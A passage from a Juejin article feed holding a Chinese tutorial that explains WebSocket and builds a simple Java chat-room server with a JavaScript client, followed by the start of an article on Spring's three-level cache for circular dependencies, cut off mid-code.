content="https://juejin.cn/user/2212696294690520"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            websocket的理解，写一个在线聊天室
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2212696294690520/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    李承影
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T03:03:10.000Z" title="Tue Jan 13 2026 03:03:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">对websocket的理解</h2>
<p>websocket，也是应用层的网络通信协议，要理解它是什么，<strong>就要问为什么会出现这个协议</strong>。</p>
<p>在没有websocket以前，我们都是用http协议做数据收发，渐渐的，我们发现有一些场景http的特性无法很好地处理。例如，<strong>服务端想主动发送给客户端信息的时候怎么办</strong>？如果用http来处理这个场景，就涉及到客户端方面的轮询。</p>
<p>但是轮询的逻辑是按照一定的频率，客户端不断地发送请求包，去看服务端是否“有话对我们说”。</p>
<p>这带来了两个主要的问题：</p>
<p>第一，服务端何时发送数据是不确定的，长时间持续地发送请求查询，其中大量的请求是无效的，网络利用率低下。</p>
<p>第二，对于需要实时发送的信息，轮询只能周期性地获取，如果服务端想要发送信息，需要等到下一个轮询周期才可以，会造成信息的延迟。如果是在线游戏，视频聊天什么的，用户当天就会打个差评再卸载掉。</p>
<p>所以，关键是要做到当服务端想发送的时候，就立刻主动地发送信息。</p>
<p>而websocket就能达成这一功能，它的特性是<strong>全双工通信</strong>，此外还有<strong>低延迟，数据包传输效率高</strong>的特性。这些特性都是相较于http协议来说的，你可以这么认为，想要专门应对需要高效全双工交互的应用场景，但http表示臣妾做不到啊，所以你新纳一个嫔妃websocket，专门帮你干这些活儿。</p>
<p>如果之前除了http协议以外没有接触过应用层协议，那么一开始是难以接受websocket概念的。为了更好地理解，需要跟http做一些关键的对比。</p>
<ol>
<li>http是请求-响应模式，必须要有请求，才有回复（且服务端不能主动请求）。websocket是全双工通信的，有信息就主动传达给对方。</li>
<li>http短连接（一次来回后就默认关闭连接）。websocket是长连接。</li>
<li>http是无状态。websocket是有状态的。</li>
</ol>
<h2 data-id="heading-1">websocket是如何工作的</h2>
<ol>
<li>发出连接请求，客户端发送的第一个请求，是一个http请求，与普通http不同的是</li>
</ol>

<pre><code class="hljs language-arduino" lang="arduino">Upgrade: websocket  <span class="hljs-comment">// upgrade是一个http标准头部，指定希望升级到的协议</span>
Connection: Upgrade <span class="hljs-comment">// connection设定完成协议升级后是否保持连接</span>
</code></pre>
<p>2.  服务器同意握手的响应</p>

<pre><code class="hljs language-arduino" lang="arduino">Upgrade: websocket          <span class="hljs-comment">// 确认升级到 WebSocket</span>
Connection: Upgrade         <span class="hljs-comment">// 核心：确认连接已升级</span>
</code></pre>
<p>3.  通信阶段</p>
<p>核心报文数据：</p>
<ul>
<li><strong>FIN：是否是结束帧，FIN=0表示还有后续，FIN=1表示是最后一个数据帧</strong></li>
<li><strong>Opcode：帧类型，数据类型（即这个数据包是干什么的）</strong></li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/84be00b42379458fbf88e8b7c9514c50~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5om_5b2x:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768878190&amp;x-signature=ccLZMoJAFIIWXx7udNcMlduQiA8%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li><strong>Mask，是否掩码,1表示是掩码，掩码是将数据报文内容转换，而非是加密</strong></li>
</ul>
<ol start="4">
<li>连接关闭</li>
</ol>
<p>一端发送关闭帧，另一端接受到关闭帧后，发送响应关闭帧。对话之后TCP断连。</p>
<h2 data-id="heading-2">代码实现一下websocket</h2>
<p>现在通过java的方式来写一个websocket案例。</p>
<p>纯websocket的实现：</p>
<pre><code class="hljs language-javascript" lang="javascript">&lt;--依赖包--&gt;
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.java-websocket<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>Java-WebSocket<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.5.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span> 
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></span>
</code></pre>

<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebsocketChatRoom</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">WebSocketServer</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-title class_">WebsocketChatRoom</span>(int port) {
        <span class="hljs-variable language_">super</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InetSocketAddress</span>(port));
    }


    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">onOpen</span>(<span class="hljs-params">WebSocket webSocket, ClientHandshake clientHandshake</span>) {
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"新连接到达："</span>+ webSocket.<span class="hljs-title function_">getRemoteSocketAddress</span>());
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">onClose</span>(<span class="hljs-params">WebSocket webSocket, int i, <span class="hljs-built_in">String</span> s, <span class="hljs-built_in">boolean</span> b</span>) {
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"连接关闭："</span> + webSocket.<span class="hljs-title function_">getRemoteSocketAddress</span>());
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">onMessage</span>(<span class="hljs-params">WebSocket webSocket, <span class="hljs-built_in">String</span> s</span>) {
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"收到信息："</span> + s);
        <span class="hljs-comment">// websocketServer自带的广播实现</span>
        <span class="hljs-title function_">broadcast</span>(s);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">onError</span>(<span class="hljs-params">WebSocket webSocket, Exception e</span>) {
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"连接错误： "</span>+e.<span class="hljs-title function_">getMessage</span>());
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">onStart</span>(<span class="hljs-params"/>) {

    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-built_in">String</span>[] args</span>) {
        int port = <span class="hljs-number">8888</span>;
        <span class="hljs-title class_">WebsocketChatRoom</span> server = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebsocketChatRoom</span>(port);
        server.<span class="hljs-title function_">start</span>();
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"聊天室，启动！: "</span> + port);
    }
}
</code></pre>
<p>上述的重点是继承WebSocketServer，它定义多个接口，每个接口望文生义，即各自连接阶段做的事情。最重要的是onMessage，参数为连接信息和报文文本。</p>
<p>作为后端开发，我们再请出deepseek大神帮我们写一个前端聊天窗口。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9df13865e96146d6b1f8c77e34a51f74~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5om_5b2x:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768878190&amp;x-signature=4Dpg6SjpAe5hutUQRbJXFqMdaNs%3D" alt="image.png" loading="lazy"/></p>
<p>重要的是前端连接逻辑：</p>
<pre><code class="hljs language-ini" lang="ini">// 创建连接
<span class="hljs-attr">socket</span> = new WebSocket(serverUrl)<span class="hljs-comment">;</span>

// websocket各阶段的处理器
<span class="hljs-attr">socket.onopen</span> = (event) =&gt; {
    console.log('WebSocket connection opened:', event)<span class="hljs-comment">;</span>
    <span class="hljs-attr">statusIndicator.className</span> = <span class="hljs-string">'status-indicator connected'</span><span class="hljs-comment">;</span>
    <span class="hljs-attr">statusText.textContent</span> = <span class="hljs-string">'Connected to server'</span><span class="hljs-comment">;</span>
    <span class="hljs-attr">sendButton.disabled</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
    
    // Add connection message to chat
    addMessage('System', 'Connected to the WebSocket server', 'received')<span class="hljs-comment">;</span>
}<span class="hljs-comment">;</span>

<span class="hljs-attr">socket.onmessage</span> = (event) =&gt; {
    console.log('Message from server:', event.data)<span class="hljs-comment">;</span>
    
    addMessage('Server', event.data, 'received')<span class="hljs-comment">;</span>
    
    // Auto-scroll to bottom
    <span class="hljs-attr">chatBox.scrollTop</span> = chatBox.scrollHeight<span class="hljs-comment">;</span>
}<span class="hljs-comment">;</span>

<span class="hljs-attr">socket.onclose</span> = (event) =&gt; {
    console.log('WebSocket connection closed:', event)<span class="hljs-comment">;</span>
    <span class="hljs-attr">statusIndicator.className</span> = <span class="hljs-string">'status-indicator'</span><span class="hljs-comment">;</span>
    <span class="hljs-attr">statusText.textContent</span> = <span class="hljs-string">'Disconnected from server'</span><span class="hljs-comment">;</span>
    <span class="hljs-attr">sendButton.disabled</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
    
    // Add disconnection message to chat
    addMessage('System', 'Disconnected from the server', 'received')<span class="hljs-comment">;</span>
    
    // Try to reconnect after 5 seconds
    setTimeout(() =&gt; {
        if (!socket || <span class="hljs-attr">socket.readyState</span> === WebSocket.CLOSED) {
            <span class="hljs-attr">statusText.textContent</span> = <span class="hljs-string">'Reconnecting...'</span><span class="hljs-comment">;</span>
            initWebSocket()<span class="hljs-comment">;</span>
        }
    }, 5000)<span class="hljs-comment">;</span>
}<span class="hljs-comment">;</span>

<span class="hljs-attr">socket.onerror</span> = (error) =&gt; {
    console.error('WebSocket error:', error)<span class="hljs-comment">;</span>
    <span class="hljs-attr">statusText.textContent</span> = <span class="hljs-string">'Connection error'</span><span class="hljs-comment">;</span>
    <span class="hljs-attr">sendButton.disabled</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
}<span class="hljs-comment">;</span>
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c50b433c88624e86993e354e12dc3e91~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5om_5b2x:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768878190&amp;x-signature=nCyK7VRbxdgoCsZfWFVNtkEfO30%3D" alt="image.png" loading="lazy"/></p>
<p>打开两个窗口，打开时会创建自己的用户名，然后在聊天室发送信息，即可同步信息了。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[你真的理解Spring三级缓存吗]]></title>    <link>https://juejin.cn/post/7594358540048547875</link>    <guid>https://juejin.cn/post/7594358540048547875</guid>    <pubDate>2026-01-13T03:09:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594358540048547875" data-draft-id="7594303923362660392" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="你真的理解Spring三级缓存吗"/> <meta itemprop="keywords" content="后端,面试"/> <meta itemprop="datePublished" content="2026-01-13T03:09:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="omenkk7"/> <meta itemprop="url" content="https://juejin.cn/user/933901076016858"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            你真的理解Spring三级缓存吗
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/933901076016858/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    omenkk7
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T03:09:38.000Z" title="Tue Jan 13 2026 03:09:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Spring三级缓存：循环依赖的解决方案</h2>
<p>在Spring框架中，循环依赖是Bean创建过程中常见的问题 针对这种问题 我们可以通过编码手段去解决</p>
<p>而Spring也为我们提供了一种解决手段 也就是<strong>三级缓存</strong></p>
<p>本文将从缓存设计、解决逻辑、并发安全及场景限制等维度，详细解析三级缓存的工作原理。</p>
<h3 data-id="heading-1">一、三级缓存的核心设计目的</h3>
<p>三级缓存是Spring为解决<strong>Bean循环依赖</strong>问题专门设计的缓存体系，其核心思路是通过“对象初始化延后”的方式，</p>
<p>在Bean未完全初始化时提前暴露引用，从而打破循环依赖的死锁。</p>
<h3 data-id="heading-2">二、三级缓存的定义与职责</h3>
<p>Spring在<code>DefaultSingletonBeanRegistry</code>类中定义了三级缓存，各自承担不同职责：</p>
<pre><code class="hljs language-scala" lang="scala">public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DefaultSingletonBeanRegistry</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">SimpleAliasRegistry</span> <span class="hljs-title">implements</span> <span class="hljs-title">SingletonBeanRegistry</span> </span>{
    <span class="hljs-keyword">private</span> static <span class="hljs-keyword">final</span> int <span class="hljs-type">SUPPRESSED_EXCEPTIONS_LIMIT</span> = <span class="hljs-number">100</span>;
    
    <span class="hljs-comment">// 一级缓存：保存**完全初始化完成**的单例Bean（最终可用状态）</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Map</span>&lt;<span class="hljs-type">String</span>, <span class="hljs-type">Object</span>&gt; singletonObjects = <span class="hljs-keyword">new</span> <span class="hljs-type">ConcurrentHashMap</span>(<span class="hljs-number">256</span>);
    
    <span class="hljs-comment">// 二级缓存：保存**半成品Bean**（实例化完成、未初始化的早期引用）</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Map</span>&lt;<span class="hljs-type">String</span>, <span class="hljs-type">Object</span>&gt; earlySingletonObjects = <span class="hljs-keyword">new</span> <span class="hljs-type">ConcurrentHashMap</span>(<span class="hljs-number">16</span>);
    
    <span class="hljs-comment">// 三级缓存：保存Bean的创建工厂（用于生成早期Bean引用）</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Map</span>&lt;<span class="hljs-type">String</span>, <span class="hljs-type">ObjectFactory</span>&lt;?&gt;&gt; singletonFactories = <span class="hljs-keyword">new</span> <span class="hljs-type">HashMap</span>(<span class="hljs-number">16</span>);
}
</code></pre>





























<table><thead><tr><th>缓存层级</th><th>名称</th><th>核心作用</th><th>数据类型</th></tr></thead><tbody><tr><td>一级缓存</td><td>singletonObjects</td><td>存储完全初始化的成熟Bean</td><td>Map&lt;String, Object&gt;</td></tr><tr><td>二级缓存</td><td>earlySingletonObjects</td><td>存储实例化完成的早期Bean引用</td><td>Map&lt;String, Object&gt;</td></tr><tr><td>三级缓存</td><td>singletonFactories</td><td>存储Bean的创建工厂</td><td>Map&lt;String, ObjectFactory&gt;</td></tr></tbody></table>
<h3 data-id="heading-3">三、三级缓存解决循环依赖的核心逻辑</h3>
<p>Spring将Bean的创建分为<strong>实例化</strong>（调用构造方法创建对象）和<strong>初始化</strong>（填充属性、执行初始化方法）两个阶段，三级缓存的核心作用是在“实例化后、初始化前”提前暴露Bean引用。</p>
<h4 data-id="heading-4">核心获取逻辑（getSingleton方法）</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Nullable</span>
<span class="hljs-keyword">protected</span> Object getSingleton(String beanName, boolean allowEarlyReference) {
    <span class="hljs-comment">// 1. 优先从一级缓存获取完全初始化的Bean</span>
    Object singletonObject = <span class="hljs-keyword">this</span>.singletonObjects.<span class="hljs-keyword">get</span>(beanName);
    
    <span class="hljs-comment">// 2. 一级缓存无数据，且当前Bean正在创建中 → 尝试二级缓存</span>
    <span class="hljs-keyword">if</span> (singletonObject == <span class="hljs-literal">null</span> &amp;&amp; isSingletonCurrentlyInCreation(beanName)) {
        singletonObject = <span class="hljs-keyword">this</span>.earlySingletonObjects.<span class="hljs-keyword">get</span>(beanName);
        
        <span class="hljs-comment">// 3. 二级缓存无数据，且允许提前引用 → 从三级缓存生成早期Bean</span>
        <span class="hljs-keyword">if</span> (singletonObject == <span class="hljs-literal">null</span> &amp;&amp; allowEarlyReference) {
            <span class="hljs-comment">// 加锁保证缓存操作的线程安全（统一锁一级缓存避免多锁死锁）</span>
            synchronized (<span class="hljs-keyword">this</span>.singletonObjects) {
                <span class="hljs-comment">// 双重检查：再次确认一级/二级缓存（防止并发写入）</span>
                singletonObject = <span class="hljs-keyword">this</span>.singletonObjects.<span class="hljs-keyword">get</span>(beanName);
                <span class="hljs-keyword">if</span> (singletonObject == <span class="hljs-literal">null</span>) {
                    singletonObject = <span class="hljs-keyword">this</span>.earlySingletonObjects.<span class="hljs-keyword">get</span>(beanName);
                    <span class="hljs-keyword">if</span> (singletonObject == <span class="hljs-literal">null</span>) {
                        <span class="hljs-comment">// 4. 从三级缓存获取Bean工厂，生成早期Bean引用</span>
                        ObjectFactory&lt;?&gt; singletonFactory = <span class="hljs-keyword">this</span>.singletonFactories.<span class="hljs-keyword">get</span>(beanName);
                        <span class="hljs-keyword">if</span> (singletonFactory != <span class="hljs-literal">null</span>) {
                            singletonObject = singletonFactory.getObject();
